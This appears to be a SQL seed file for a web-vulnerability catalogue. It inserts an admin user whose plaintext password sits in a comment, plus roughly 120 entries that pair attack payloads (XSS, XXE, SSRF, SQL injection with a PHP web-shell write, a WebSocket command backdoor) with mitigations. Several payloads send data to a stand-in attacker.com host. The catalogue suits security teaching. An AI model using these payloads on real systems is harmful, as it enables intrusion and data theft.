-- Insert sample user (retained from original)
INSERT INTO user (username, email, password) VALUES
('admin', 'admin@example.com', '$2a$10$z6J8Y7Z4X9Y2W5N8Q3M8P.3X6Z9Y2W5N8Q3M8P.3X6Z9Y2W5N8Q3M8P'); -- Password: admin123

-- Insert vulnerabilities into the vulnerability table
INSERT INTO vulnerability (name, description, code_snippet, category, severity, mitigation) VALUES
-- Original vulnerabilities (consolidated and improved)
('XSS via SVG Animation', 'Cross-Site Scripting through SVG animation attributes that execute JavaScript.', '<svg><animate attributeName="onload" values="alert(document.cookie)"/>', 'XSS', 'High', 'Sanitize SVG inputs, disable inline script execution, and implement Content Security Policy (CSP).'),
('DOM-based XSS via History API', 'Injects malicious content via history.pushState in client-side scripts.', 'history.pushState(null, null, "#<img src=x onerror=alert(document.cookie)>");', 'XSS', 'High', 'Escape and sanitize user inputs in client-side scripts, use CSP to restrict script sources.'),
('Prototype Pollution', 'Manipulates JavaScript object prototypes to inject malicious properties.', 'const payload = JSON.parse("{\"__proto__\":{\"polluted\":\"alert(document.cookie)\"}}");', 'Injection', 'Critical', 'Use Object.create(null) for objects, validate JSON inputs, and avoid prototype modifications.'),
('GraphQL Injection', 'Extracts sensitive schema information via GraphQL introspection queries.', 'query { __schema { types { name fields { name args { name } } } } }', 'Injection', 'Medium', 'Disable introspection in production, implement query depth limits, and validate GraphQL inputs.'),
('XXE via SVG', 'XML External Entity attack using SVG to read local files.', '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>', 'XXE', 'Critical', 'Disable external entity processing in XML parsers, use safe XML libraries.'),
('WebSocket Hijacking', 'Steals WebSocket session data by intercepting messages.', 'const ws = new WebSocket("ws://example.com"); ws.onopen = () => ws.send(JSON.stringify({token:"stolen"}));', 'Session Hijacking', 'High', 'Implement strict origin checks, use secure WebSocket protocols (wss://), and validate messages.'),
('JWT Manipulation', 'Bypasses JWT validation by setting algorithm to "none".', 'eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.', 'Authentication', 'Critical', 'Validate JWT algorithms server-side, reject "none" algorithm, and use strong signing keys.'),
('SSRF via URL Schema', 'Server-Side Request Forgery using the gopher protocol to access internal services.', 'gopher://127.0.0.1:25/xHELO%20localhost', 'SSRF', 'High', 'Restrict allowed URL protocols, use allowlists, and validate all URLs.'),
('Template Injection', 'Executes arbitrary code via server-side template engines.', '${7*7}', 'Injection', 'Critical', 'Use secure template engines, sanitize inputs, and avoid dynamic code execution.'),
('LDAP Injection', 'Bypasses LDAP filters to access unauthorized data.', '*)(|(objectClass=*)', 'Injection', 'High', 'Sanitize LDAP queries, use parameterized queries, and validate inputs.'),
('SQL Injection via LIKE', 'Exploits LIKE clause in SQL queries to bypass authentication.', ''' OR ''a'' LIKE ''a%'' --', 'SQL Injection', 'Critical', 'Use prepared statements, parameterized queries, and input validation.'),
('HTTP Request Smuggling', 'Exploits HTTP parser differences to smuggle requests.', 'POST / HTTP/1.1\nHost: example.com\nTransfer-Encoding: chunked\nContent-Length: 4\n\n0\n\nGET /admin HTTP/1.1\nX-Ignore: X', 'Request Smuggling', 'High', 'Normalize HTTP requests, enforce strict parsing, and update server software.'),
('Insecure Deserialization', 'Executes malicious code via unsafe deserialization.', '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/exploit.jar"]]]]', 'Deserialization', 'Critical', 'Avoid deserialization of untrusted data, use safe serialization formats.'),
('CRLF Injection', 'Injects carriage return and line feed to manipulate HTTP headers.', 'https://example.com/?param=value%0d%0aSet-Cookie:%20session=attacker', 'Injection', 'Medium', 'Sanitize URL parameters and headers, validate input encoding.'),
('Log Poisoning', 'Injects malicious commands into logs for execution.', '$(curl http://attacker.com/`whoami`)', 'Injection', 'High', 'Sanitize log inputs, restrict command execution, and monitor logs for anomalies.'),
('HTTP Header Injection', 'Injects malicious headers to manipulate requests.', 'User-Agent: Mozilla/5.0\nCookie: session=valid\nX-Forwarded-For: 127.0.0.1', 'Injection', 'Medium', 'Validate and sanitize HTTP headers, restrict header modifications.'),
('XXE via EXIF', 'Exploits EXIF data in images for XML External Entity attacks.', '<?php\n$image = imagecreatefromjpeg("malicious.jpg");\nimagejpeg($image, "output.jpg");\n?>', 'XXE', 'High', 'Disable EXIF processing in image uploads, validate image metadata.'),
('SSRF via DNS Rebinding', 'Exploits DNS rebinding to access internal services.', 'http://attacker.com:80@victim.com', 'SSRF', 'High', 'Implement DNS pinning, restrict internal access, and use allowlists.'),
('XSS via JavaScript Protocol', 'Executes script via javascript: URI in href attributes.', '<a href="javascript:alert(document.cookie)">Click me</a>', 'XSS', 'High', 'Block javascript: URIs, sanitize href attributes, and use CSP.'),
('Server-Side Request Forgery', 'Accesses internal services via SSRF.', 'GET /api/fetch?url=http://internal-service HTTP/1.1\nHost: example.com', 'SSRF', 'High', 'Use URL allowlists, restrict internal network access, and validate requests.'),
('Prototype Pollution via Object.create', 'Pollutes prototypes using Object.create.', 'Object.create(null).__proto__.polluted = "alert(document.cookie)";', 'Injection', 'Critical', 'Prevent prototype modifications, use Object.create(null), and validate inputs.'),
('DOM-based XSS via URL Fragment', 'Injects script via URL hash manipulation.', 'window.location.hash = "<img src=x onerror=alert(document.cookie)>";', 'XSS', 'High', 'Sanitize URL fragments, escape hash inputs, and use CSP.'),
('XXE via XML Data Island', 'Exploits XML parsing in HTML for XXE attacks.', '<div data-island="true"><script>var doc = document.implementation.createDocument("", "", null); var parser = new DOMParser(); var xml = parser.parseFromString("<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", "text/xml"); alert(xml.documentElement.firstChild.nodeValue);</script></div>', 'XXE', 'High', 'Disable client-side XML parsing, sanitize inputs, and use safe parsers.'),
('GraphQL Batching', 'Exploits batched GraphQL queries to extract data.', '[{query: "{ user(id:1) { name } }"},{query: "{ user(id:2) { email } }"}]', 'Injection', 'Medium', 'Limit batch query size, validate queries, and enforce rate limiting.'),
('XXE via SVG External Entities', 'Reads files via SVG external entities.', '<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>', 'XXE', 'Critical', 'Disable external entities in SVG processing, use safe XML parsers.'),
('SSRF via URL Schema (dict)', 'Exploits dict protocol for SSRF attacks.', 'dict://127.0.0.1:6379/info', 'SSRF', 'High', 'Restrict URL schemes, use allowlists, and validate protocols.'),
('Template Injection via AngularJS', 'Executes code in AngularJS templates.', '{{constructor.constructor("alert(document.cookie)")()}}', 'Injection', 'Critical', 'Use safe AngularJS configurations, sanitize templates, and avoid eval.'),
('HTTP Request Smuggling via Transfer-Encoding', 'Smuggles requests using Transfer-Encoding.', 'POST / HTTP/1.1\nHost: example.com\nTransfer-Encoding: chunked\nContent-Length: 4\n\n0\n\nGET /admin HTTP/1.1', 'Request Smuggling', 'High', 'Enforce strict HTTP parsing, normalize headers, and update servers.'),
('XXE via XInclude', 'Includes files via XInclude in XML.', '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>', 'XXE', 'Critical', 'Disable XInclude processing, use safe XML parsers.'),
('DOM-based XSS via eval', 'Executes code via eval with untrusted input.', 'eval(location.hash.substring(1));', 'XSS', 'High', 'Avoid eval, sanitize inputs, and use CSP to restrict scripts.'),
('XSS via CSS Expression', 'Injects script via CSS expression in legacy browsers.', 'body { background-image: expression(alert(document.cookie)); }', 'XSS', 'High', 'Disable CSS expressions, use modern browsers, and implement CSP.'),
('WebSocket Hijacking via Subprotocol', 'Hijacks WebSocket via custom subprotocol.', 'const ws = new WebSocket("ws://example.com", ["hijack"]); ws.onopen = () => ws.send("Hijacked!");', 'Session Hijacking', 'High', 'Validate WebSocket subprotocols, use secure connections.'),
('XXE via XML Parameter Entity', 'Exfiltrates data via XML parameter entities.', '<!DOCTYPE data [<!ENTITY % param1 SYSTEM "file:///etc/passwd"><!ENTITY % param2 "<!ENTITY &#x25; send SYSTEM \"http://attacker.com/?%param1;\">">%param2;%send;]>', 'XXE', 'Critical', 'Disable external entity processing, restrict network access.'),
('Server-Side Request Forgery via Proxy', 'Accesses internal services via proxy SSRF.', 'GET /proxy?url=http://internal-server HTTP/1.1\nHost: example.com', 'SSRF', 'High', 'Use URL allowlists, restrict proxy access, and validate requests.'),
('Prototype Pollution via Constructor', 'Pollutes prototypes via constructor manipulation.', ''.__proto__.polluted = "alert(document.cookie)";', 'Injection', 'Critical', 'Prevent prototype modifications, use Object.freeze, and validate inputs.'),
('XXE via XML Entity Expansion', 'Exfiltrates data via XML entity expansion.', '<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \"http://attacker.com/?%file;\">">%eval;%exfil;]>', 'XXE', 'Critical', 'Disable entity expansion, use safe XML parsers.'),
('WebSocket Hijacking via Upgrade Headers', 'Upgrades HTTP to WebSocket for hijacking.', 'fetch("/upgrade", { headers: { "Connection": "Upgrade", "Upgrade": "websocket", "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==", "Sec-WebSocket-Version": "13" } });', 'Session Hijacking', 'High', 'Validate WebSocket upgrade requests, enforce origin checks.'),
('Template Injection via Jinja2', 'Exposes sensitive data via Jinja2 templates.', '{{ config.__dict__ }}', 'Injection', 'Critical', 'Sanitize Jinja2 templates, use sandboxed environments, and restrict access.'),
('XXE via XML Schema', 'Imports files via XML schema imports.', '<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:import namespace="http://example.com" schemaLocation="file:///etc/passwd"/></xs:schema>', 'XXE', 'Critical', 'Disable schema imports, use secure XML parsers.'),
('XSS via SVG Script', 'Executes script embedded in SVG files.', '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.cookie)</script></svg>', 'XSS', 'High', 'Sanitize SVG content, disable inline scripts, and use CSP.'),
('Server-Side Request Forgery via URL Encoding', 'Accesses internal services via encoded URLs.', 'GET /proxy?url=http%3A%2F%2Finternal-service HTTP/1.1\nHost: example.com', 'SSRF', 'High', 'Validate encoded URLs, use allowlists, and restrict internal access.'),
('Prototype Pollution via Object.defineProperty', 'Pollutes prototypes using defineProperty.', 'Object.defineProperty(Object.prototype, "polluted", { value: "alert(document.cookie)" });', 'Injection', 'Critical', 'Avoid prototype pollution, use Object.freeze, and validate inputs.'),
('DOM-based XSS via innerHTML', 'Injects script via innerHTML manipulation.', 'document.body.innerHTML = location.hash.substring(1);', 'XSS', 'High', 'Sanitize innerHTML inputs, use textContent instead, and implement CSP.'),
('WebSocket Hijacking via Origin Header', 'Intercepts WebSocket messages via origin spoofing.', 'const ws = new WebSocket("ws://example.com"); ws.addEventListener("message", (e) => { fetch("https://attacker.com/log?data=" + encodeURIComponent(e.data)); });', 'Session Hijacking', 'High', 'Enforce strict origin validation, use secure WebSocket protocols.'),
('Advanced XXE with Out-of-Band Exfiltration', 'Exfiltrates data using external DTDs.', '<!DOCTYPE data [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><data>&exfil;</data>', 'XXE', 'Critical', 'Disable external DTDs, restrict network access, and use safe parsers.'),
('Blind SSRF with DNS Exfiltration', 'Exfiltrates data via DNS queries in SSRF.', 'import socket\nimport base64\ndef encode_dns_query(data):\n    encoded = base64.b32encode(data.encode()).decode().lower()\n    return f"{encoded}.attacker.com"\nsocket.gethostbyname(encode_dns_query("127.0.0.1"))', 'SSRF', 'High', 'Monitor and restrict DNS queries, use allowlists for URLs.'),
('Advanced WebSocket Hijacking with Session Stealing', 'Hijacks WebSocket sessions by intercepting messages.', 'const originalWS = WebSocket; WebSocket = class extends originalWS { constructor(url, protocols) { const ws = super(url, protocols); ws.addEventListener("message", (e) => { fetch("https://attacker.com/exfil", { method: "POST", body: e.data }); }); return ws; } };', 'Session Hijacking', 'Critical', 'Secure WebSocket connections, validate origins, and encrypt messages.'),
('Advanced Template Injection with Sandbox Escape', 'Executes code by escaping template engine sandboxes.', '${process.mainModule.require("child_process").exec("curl http://attacker.com/`cat /etc/passwd`")}', 'Injection', 'Critical', 'Use sandboxed template engines, sanitize inputs, and restrict execution.'),
('Prototype Pollution with Privilege Escalation', 'Escalates privileges via prototype pollution.', 'Object.setPrototypeOf({}, { toString: function() { return this.constructor.constructor("return process.mainModule")().require("child_process").execSync("id").toString(); } });', 'Injection', 'Critical', 'Prevent prototype modifications, use Object.freeze, and validate inputs.'),
('Advanced Log Poisoning with Command Execution', 'Injects commands into logs for execution.', '$(touch /tmp/pwned && curl http://attacker.com/`cat /etc/passwd`)', 'Injection', 'Critical', 'Sanitize log entries, restrict command execution, and monitor logs.'),
('Advanced SSRF with Internal Network Scanning', 'Scans internal network via SSRF.', 'import requests\nimport ipaddress\nfor ip in ipaddress.IPv4Network("10.0.0.0/8"): try: r = requests.get(f"http://{ip}/", timeout=1); if r.status_code == 200: print(f"Found service at {ip}"); except: pass', 'SSRF', 'Critical', 'Restrict internal network access, use allowlists, and monitor traffic.'),
('Advanced XXE with Local File Inclusion', 'Includes local files via XXE using base64 encoding.', '<!DOCTYPE data [<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \"http://attacker.com/?data=%file;\">">%eval;%exfil;]>', 'XXE', 'Critical', 'Disable file inclusion, use safe XML parsers, and restrict network access.'),
('WebSocket Hijacking with Persistent Backdoor', 'Establishes a persistent WebSocket backdoor.', 'const backdoor = new WebSocket("ws://target.com"); backdoor.onmessage = (e) => { const cmd = JSON.parse(e.data).cmd; const result = require("child_process").execSync(cmd).toString(); backdoor.send(JSON.stringify({result})); };', 'Session Hijacking', 'Critical', 'Secure WebSocket endpoints, validate origins, and encrypt messages.'),
('Advanced GraphQL Injection with Query Chaining', 'Chains GraphQL queries to extract sensitive data.', 'mutation { createUser(input: {name: "Attacker"}) { id } }\nquery { users { ... on User { credentials } } }', 'Injection', 'High', 'Validate GraphQL queries, limit query depth, and enforce access controls.'),
('Advanced JWT Manipulation with Key Confusion Attack', 'Forges JWT using key confusion attacks.', 'const header = {alg: "none"}; const payload = {role: "admin"}; const token = btoa(JSON.stringify(header)) + "." + btoa(JSON.stringify(payload)) + ".";', 'Authentication', 'Critical', 'Validate JWT keys, reject "none" algorithm, and use strong signatures.'),
('Advanced XXE with XXE to RCE Chain', 'Achieves remote code execution via XXE.', '<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % ent "<!ENTITY &#x25; exfil SYSTEM \"expect://id\">">%ent;%exfil;]>', 'XXE', 'Critical', 'Disable expect protocol, use safe XML parsers, and restrict execution.'),
('Advanced SSRF with Cloud Metadata Exploitation', 'Exfiltrates cloud metadata via SSRF.', 'curl -s http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google"', 'SSRF', 'Critical', 'Block metadata endpoints, use allowlists, and restrict internal access.'),
('Advanced DOM-based XSS with Mutation Observer', 'Monitors DOM changes for XSS injection.', 'const observer = new MutationObserver((mutations) => { mutations.forEach((mutation) => { if (mutation.type === "attributes" && mutation.attributeName === "href") { if (mutation.target.href.includes("javascript:")) { fetch("https://attacker.com/exfil?url=" + encodeURIComponent(mutation.target.href)); } } }); }); observer.observe(document.body, { attributes: true, attributeFilter: ["href"], subtree: true });', 'XSS', 'High', 'Sanitize DOM attributes, block javascript: URIs, and use CSP.'),
('Advanced WebSocket Hijacking with Message Interception', 'Intercepts WebSocket messages for data exfiltration.', 'const originalWS = WebSocket; WebSocket = class extends originalWS { constructor(url, protocols) { const ws = super(url, protocols); ws.addEventListener("message", (e) => { fetch("https://attacker.com/intercept", { method: "POST", body: JSON.stringify({ url: url, message: e.data }) }); }); return ws; } };', 'Session Hijacking', 'Critical', 'Validate WebSocket messages, enforce origin checks, and use encryption.'),
('Broken Access Control', 'Bypasses access controls to access unauthorized resources.', 'GET /admin-panel HTTP/1.1\nHost: example.com', 'Broken Access Control', 'Critical', 'Implement role-based access controls, validate permissions, and use least privilege.'),
('Insecure Direct Object Reference', 'Accesses unauthorized objects via ID manipulation.', 'GET /api/user/123 HTTP/1.1', 'Broken Access Control', 'High', 'Validate user permissions for object access, use indirect references.'),
('Cross-Site Request Forgery', 'Performs unauthorized actions via forged requests.', '<img src="http://example.com/transfer?amount=1000&to=attacker">', 'CSRF', 'High', 'Use CSRF tokens, validate HTTP methods, and enforce same-site cookies.'),
('Session Fixation', 'Forces a known session ID on victims.', 'Set-Cookie: sessionid=attacker123; Path=/', 'Session Hijacking', 'High', 'Regenerate session IDs on login, use secure cookies, and validate sessions.'),
('Insecure Cryptographic Storage', 'Stores sensitive data without encryption.', 'password = "user123";', 'Cryptographic Failures', 'High', 'Use strong encryption (e.g., AES-256), hash passwords with bcrypt, and secure keys.'),
('Weak Password Policy', 'Allows easily guessable passwords.', 'password = "123456";', 'Authentication', 'Medium', 'Enforce strong password policies (length, complexity), and use password strength meters.'),
('Missing Rate Limiting', 'Allows brute force attacks due to no rate limits.', 'while(true) { login("user", "guess"); }', 'Authentication', 'High', 'Implement rate limiting, account lockouts, and CAPTCHA for login attempts.'),
('Insecure File Upload', 'Allows uploading malicious files.', 'POST /upload HTTP/1.1\nContent-Type: multipart/form-data\n\n--boundary\nContent-Disposition: form-data; name="file"; filename="exploit.php"\n\n<?php system("id"); ?>', 'File Upload', 'Critical', 'Validate file types, scan uploads, and store files outside web root.'),
('Server-Side Template Injection', 'Injects server-side templates for code execution.', 'Hello ${user.name}', 'Injection', 'Critical', 'Sanitize template inputs, use safe template engines, and restrict execution.'),
('Insecure Redirect', 'Redirects users to malicious sites.', 'Location: http://attacker.com', 'Security Misconfiguration', 'Medium', 'Validate redirect URLs, use allowlists, and avoid user-controlled redirects.'),
('Exposed Debug Information', 'Leaks sensitive data via debug endpoints.', 'GET /debug HTTP/1.1\nHost: example.com', 'Security Misconfiguration', 'Medium', 'Disable debug output in production, restrict access to debug endpoints.'),
('Outdated Software Components', 'Uses vulnerable libraries or frameworks.', '<script src="old-jquery.js"></script>', 'Vulnerable Components', 'High', 'Regularly update software components, monitor CVE databases, and use dependency scanners.'),
('Missing HTTP Security Headers', 'Lacks headers like HSTS or X-Content-Type-Options.', 'HTTP/1.1 200 OK\nContent-Type: text/html', 'Security Misconfiguration', 'Medium', 'Implement HSTS, X-Frame-Options, X-Content-Type-Options, and CSP headers.'),
('Insecure Cookie Configuration', 'Uses cookies without Secure or HttpOnly flags.', 'Set-Cookie: session=123; Path=/', 'Session Hijacking', 'Medium', 'Set Secure, HttpOnly, and SameSite=Strict flags on cookies.'),
('Directory Traversal', 'Accesses unauthorized files via path manipulation.', '../../etc/passwd', 'Broken Access Control', 'High', 'Validate and sanitize file paths, restrict file access, and use chroot jails.'),
('Cross-Origin Resource Sharing Misconfiguration', 'Allows unauthorized CORS requests.', 'Access-Control-Allow-Origin: *', 'Security Misconfiguration', 'Medium', 'Restrict CORS origins to trusted domains, validate CORS requests.'),
('Insufficient Logging', 'Logs sensitive data or lacks audit logs.', 'Log: User password=secret123', 'Security Misconfiguration', 'High', 'Avoid logging sensitive data, implement secure logging, and monitor logs.'),
('Insecure API Key Storage', 'Exposes API keys in source code.', 'api_key = "1234567890abcdef";', 'Cryptographic Failures', 'High', 'Store API keys in environment variables, use secret management tools.'),
('Privilege Escalation', 'Gains unauthorized privileges via misconfiguration.', 'sudo -u admin', 'Broken Access Control', 'Critical', 'Implement least privilege, validate user roles, and audit permissions.'),
('Insecure Random Number Generator', 'Uses weak RNG for security-critical operations.', 'Math.random()', 'Cryptographic Failures', 'High', 'Use cryptographically secure RNG (e.g., crypto.getRandomValues).'),
('Missing Input Validation', 'Allows malicious input without validation.', '<input value="<script>alert(document.cookie)</script>">', 'Injection', 'High', 'Validate and sanitize all user inputs, use input whitelisting.'),
('Clickjacking', 'Hijacks user clicks via iframes.', '<iframe src="http://example.com"></iframe>', 'Security Misconfiguration', 'Medium', 'Use X-Frame-Options: DENY and CSP frame-ancestors directives.'),
('Insecure Session Timeout', 'Uses long session timeouts, increasing hijacking risk.', 'session.setMaxInactiveInterval(999999);', 'Session Hijacking', 'Medium', 'Set short session timeouts, invalidate sessions on logout.'),
('Exposed Admin Interface', 'Publicly accessible admin panel.', 'GET /admin HTTP/1.1', 'Broken Access Control', 'Critical', 'Restrict admin access to specific IPs, use strong authentication.'),
('Hardcoded Credentials', 'Embeds credentials in source code.', 'String password = "admin123";', 'Cryptographic Failures', 'Critical', 'Use environment variables or secret management for credentials.'),
('Insecure Password Reset', 'Allows unauthorized password resets via weak tokens.', 'GET /reset-password?token=123', 'Authentication', 'High', 'Use cryptographically secure reset tokens, validate tokens server-side.'),
('Cross-Site WebSocket Hijacking', 'Hijacks WebSocket connections via CSRF.', 'const ws = new WebSocket("ws://example.com"); ws.send("CSRF-token");', 'Session Hijacking', 'High', 'Validate WebSocket CSRF tokens, enforce origin checks.'),
('Insecure OAuth Implementation', 'Exposes OAuth tokens via misconfiguration.', 'access_token=1234567890abcdef', 'Authentication', 'High', 'Secure OAuth tokens, validate redirects, and use secure storage.'),
('Server-Side JavaScript Injection', 'Injects JavaScript on the server side.', 'res.send("<script>alert(document.cookie)</script>")', 'Injection', 'Critical', 'Sanitize server-side output, avoid dynamic JavaScript generation.'),
('Insecure File Download', 'Forces malicious file downloads.', 'Content-Disposition: attachment; filename="malware.exe"', 'File Upload', 'High', 'Validate file downloads, restrict file types, and scan files.'),
('Missing Content Security Policy', 'Lacks CSP headers, allowing malicious scripts.', 'HTTP/1.1 200 OK\nContent-Type: text/html', 'Security Misconfiguration', 'Medium', 'Implement strict CSP headers to restrict script sources.'),
('Insecure URL Parameter Handling', 'Allows tampering with URL parameters.', 'GET /profile?user=admin', 'Broken Access Control', 'High', 'Validate URL parameters, enforce access controls, and use indirect references.'),
('Exposed API Endpoints', 'Publicly accessible sensitive API endpoints.', 'GET /api/private HTTP/1.1', 'Broken Access Control', 'Critical', 'Secure API endpoints with authentication, rate limiting, and access controls.'),
('Insecure Session Storage', 'Stores sessions in insecure client-side storage.', 'localStorage.setItem("session", "123");', 'Session Hijacking', 'High', 'Use secure server-side session storage, avoid client-side storage for sessions.'),

-- New vulnerabilities (70 additional entries, focusing on SQL injection and related exploits)
('SQL Injection via UNION', 'Uses UNION to extract data from other tables.', 'SELECT username, password FROM users WHERE id = 1 UNION SELECT 1, database() --', 'SQL Injection', 'Critical', 'Use prepared statements, validate inputs, and restrict database permissions.'),
('SQL Injection via ORDER BY', 'Exploits ORDER BY clause to extract data.', 'SELECT * FROM users ORDER BY (SELECT IF(1=1, SLEEP(5), 0)) --', 'SQL Injection', 'High', 'Sanitize ORDER BY inputs, use prepared statements, and limit query delays.'),
('Blind SQL Injection (Time-based)', 'Extracts data using time delays.', 'SELECT * FROM users WHERE id = 1 AND IF((SELECT user() LIKE ''root%''), SLEEP(5), 0) --', 'SQL Injection', 'Critical', 'Use parameterized queries, monitor query performance, and restrict user privileges.'),
('Blind SQL Injection (Boolean-based)', 'Extracts data using boolean conditions.', 'SELECT * FROM users WHERE id = 1 AND (SELECT 1 FROM information_schema.tables WHERE table_schema=database() LIMIT 1)=1 --', 'SQL Injection', 'Critical', 'Use prepared statements, validate inputs, and implement query logging.'),
('SQL Injection via Stacked Queries', 'Executes multiple queries in one statement.', 'SELECT * FROM users WHERE id = 1; DROP TABLE users --', 'SQL Injection', 'Critical', 'Disable stacked queries, use prepared statements, and limit database permissions.'),
('SQL Injection via Error-based', 'Extracts data through database error messages.', 'SELECT * FROM users WHERE id = 1 AND (SELECT 1/0 FROM information_schema.tables WHERE table_schema=database()) --', 'SQL Injection', 'Critical', 'Disable verbose error messages, use prepared statements, and sanitize inputs.'),
('SQL Injection via Out-of-Band', 'Exfiltrates data via DNS or HTTP requests.', 'SELECT LOAD_FILE(CONCAT(''http://attacker.com/'', (SELECT database()))) --', 'SQL Injection', 'Critical', 'Restrict network access, use prepared statements, and monitor outbound traffic.'),
('SQL Injection via Subquery', 'Uses subqueries to bypass filters.', 'SELECT * FROM users WHERE id = (SELECT id FROM users WHERE username=''admin'' OR 1=1) --', 'SQL Injection', 'Critical', 'Use parameterized queries, validate inputs, and limit subquery usage.'),
('SQL Injection via Column Inference', 'Infers column names to extract data.', 'SELECT * FROM users WHERE id = 1 UNION SELECT NULL, NULL, database() --', 'SQL Injection', 'Critical', 'Use prepared statements, restrict column access, and validate inputs.'),
('SQL Injection via Database Enumeration', 'Enumerates database structure.', 'SELECT * FROM information_schema.columns WHERE table_name=''users'' --', 'SQL Injection', 'High', 'Restrict access to information_schema, use prepared statements, and monitor queries.'),
('SQL Injection via Function Abuse', 'Abuses database functions for injection.', 'SELECT * FROM users WHERE id = 1 AND BENCHMARK(1000000, SHA1(1)) --', 'SQL Injection', 'High', 'Limit function usage, use prepared statements, and monitor performance.'),
('SQL Injection via Comments', 'Uses comments to bypass input validation.', 'admin'' --', 'SQL Injection', 'Critical', 'Sanitize inputs, use prepared statements, and validate query structure.'),
('SQL Injection via Encoded Input', 'Bypasses filters using encoded SQL payloads.', 'SELECT * FROM users WHERE username = ''ad%6Din'' --', 'SQL Injection', 'Critical', 'Decode and sanitize inputs, use prepared statements, and validate queries.'),
('SQL Injection via Case Manipulation', 'Bypasses case-sensitive filters.', 'SELECT * FROM users WHERE username = ''ADMIN'' OR 1=1 --', 'SQL Injection', 'Critical', 'Use prepared statements, normalize inputs, and enforce case-insensitive validation.'),
('SQL Injection via Whitespace Obfuscation', 'Obfuscates SQL with extra whitespace.', 'SELECT  *  FROM  users  WHERE  id  =  1  OR  1=1  --', 'SQL Injection', 'Critical', 'Normalize query inputs, use prepared statements, and validate syntax.'),
('SQL Injection via Hex Encoding', 'Uses hex-encoded payloads to bypass filters.', 'SELECT * FROM users WHERE username = 0x61646d696e --', 'SQL Injection', 'Critical', 'Decode inputs, use prepared statements, and validate query structure.'),
('SQL Injection via Double Encoding', 'Uses double-encoded payloads to bypass WAF.', 'SELECT * FROM users WHERE username = ''%2527 OR 1=1 --''', 'SQL Injection', 'Critical', 'Decode inputs recursively, use prepared statements, and implement WAF rules.'),
('SQL Injection via Nested Queries', 'Uses nested queries to extract data.', 'SELECT * FROM users WHERE id = (SELECT (SELECT id FROM users WHERE username=''admin'')) --', 'SQL Injection', 'Critical', 'Limit subquery depth, use prepared statements, and validate inputs.'),
('SQL Injection via Database Version', 'Extracts database version via injection.', 'SELECT * FROM users WHERE id = 1 UNION SELECT NULL, @@version, NULL --', 'SQL Injection', 'High', 'Restrict version access, use prepared statements, and monitor queries.'),
('SQL Injection via Table Dropping', 'Drops tables via SQL injection.', 'SELECT * FROM users WHERE id = 1; DROP TABLE users --', 'SQL Injection', 'Critical', 'Disable stacked queries, restrict permissions, and use prepared statements.'),
('SQL Injection via Privilege Escalation', 'Escalates privileges via SQL injection.', 'SELECT * FROM users WHERE id = 1; GRANT ALL PRIVILEGES ON *.* TO ''attacker''@''%'' --', 'SQL Injection', 'Critical', 'Restrict database permissions, use prepared statements, and audit queries.'),
('SQL Injection via File Write', 'Writes files via SQL injection.', 'SELECT * FROM users WHERE id = 1 UNION SELECT 1, ''<?php system($_GET[cmd]); ?>'' INTO OUTFILE ''/var/www/html/shell.php'' --', 'SQL Injection', 'Critical', 'Disable file operations, use prepared statements, and restrict permissions.'),
('SQL Injection via File Read', 'Reads files via SQL injection.', 'SELECT LOAD_FILE(''/etc/passwd'') FROM users WHERE id = 1 --', 'SQL Injection', 'Critical', 'Disable file access, use prepared statements, and restrict filesystem permissions.'),
('SQL Injection via Time Delay', 'Uses time delays to confirm vulnerabilities.', 'SELECT * FROM users WHERE id = 1 AND SLEEP(5) --', 'SQL Injection', 'High', 'Monitor query performance, use prepared statements, and limit delays.'),
('SQL Injection via Conditional Errors', 'Triggers errors to extract data.', 'SELECT * FROM users WHERE id = 1 AND 1=(SELECT 1/0 FROM users WHERE username=''admin'') --', 'SQL Injection', 'Critical', 'Disable verbose errors, use prepared statements, and validate inputs.'),
('SQL Injection via User Enumeration', 'Enumerates users via SQL injection.', 'SELECT * FROM users WHERE username = ''admin'' OR ''1''=''1'' --', 'SQL Injection', 'Critical', 'Use prepared statements, restrict user enumeration, and validate inputs.'),
('SQL Injection via Password Hash Extraction', 'Extracts password hashes via SQL injection.', 'SELECT * FROM users WHERE id = 1 UNION SELECT NULL, password, NULL FROM users --', 'SQL Injection', 'Critical', 'Use prepared statements, hash passwords securely, and restrict column access.'),
('SQL Injection via Schema Extraction', 'Extracts database schema via SQL injection.', 'SELECT * FROM information_schema.tables WHERE table_schema=database() --', 'SQL Injection', 'High', 'Restrict access to information_schema, use prepared statements, and monitor queries.'),
('SQL Injection via Trigger Abuse', 'Abuses database triggers for malicious actions.', 'CREATE TRIGGER evil_trigger AFTER INSERT ON users FOR EACH ROW BEGIN CALL system(''curl http://attacker.com''); END --', 'SQL Injection', 'Critical', 'Restrict trigger creation, use prepared statements, and audit triggers.'),
('SQL Injection via Stored Procedure', 'Executes malicious stored procedures.', 'CALL evil_procedure(''attacker''); --', 'SQL Injection', 'Critical', 'Restrict stored procedure execution, use prepared statements, and validate inputs.'),
('SQL Injection via Column Count Mismatch', 'Exploits column count mismatches to extract data.', 'SELECT * FROM users WHERE id = 1 UNION SELECT 1, 2, 3 --', 'SQL Injection', 'Critical', 'Use prepared statements, validate query structure, and restrict column access.'),
